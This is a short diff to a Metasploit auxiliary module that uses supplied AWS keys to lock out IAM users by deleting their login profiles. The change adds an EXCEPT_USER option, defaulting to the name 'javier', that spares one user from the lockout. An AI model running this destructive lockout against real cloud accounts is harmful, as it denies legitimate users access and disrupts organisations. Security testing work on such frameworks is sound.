@@ -34,6 +34,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('AccessKeyId', [true, 'AWS access key', '']),
         OptString.new('SecretAccessKey', [true, 'AWS secret key', '']),
         OptString.new('Token', [false, 'AWS session token', '']),
+        OptString.new('EXCEPT_USER', [false, 'Does not dissable this user', 'javier']),
         OptBool.new('DRY_RUN', [true, 'Does not perform destructive actions', true])
       ]
     )
@@ -78,6 +79,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # list of all users to be dissabled
     users = doc['member'].map { |u| u['UserName'] }.select { |u| u != current_user }
+    users.delete(datastore['EXCEPT_USER'])
     print_status("Locking out users: #{users.join(',')}")
     users.each do |user|
       # delete user's profile
